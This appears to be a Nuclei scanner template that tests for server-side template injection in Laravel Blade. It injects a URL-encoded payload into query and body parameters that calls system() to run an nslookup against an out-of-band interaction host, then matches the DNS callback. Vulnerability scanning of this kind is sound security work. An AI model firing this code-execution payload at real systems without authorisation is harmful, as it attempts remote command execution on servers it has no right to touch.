id: blade-oob
info:
  name: Laravel Blade 11.27.2 - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: high
  reference:
    - https://laravel.com/docs/11.x/blade
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: dast,oast,oob,ssti,vuln
http:
  - fuzzing:
      - fuzz:
          - '{{injection}}'
        mode: single
        parts:
          - query
          - body
        type: postfix
    matchers:
      - condition: and
        # digest: 4a0a00473045022100c5a761683f3540c47ee4eb834824f049f3ffc25e8c143a8b080d27710381169c0220421dba2b9745749113448bd9d6670eccc2cd83832c58a70babd54bc86159d999:922c64590222798bb761d5b6d8e72950

        dsl:
          - contains(interactsh_protocol,'dns')
          - contains(interactsh_request,'srv')
        name: request-matcher
        type: dsl
    payloads:
      injection:
        - '%7B%7Bsystem%28%27nslookup%20-type=SRV%20{{interactsh-url}}%27%29%7D%7D%0A'
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    skip-variables-check: true
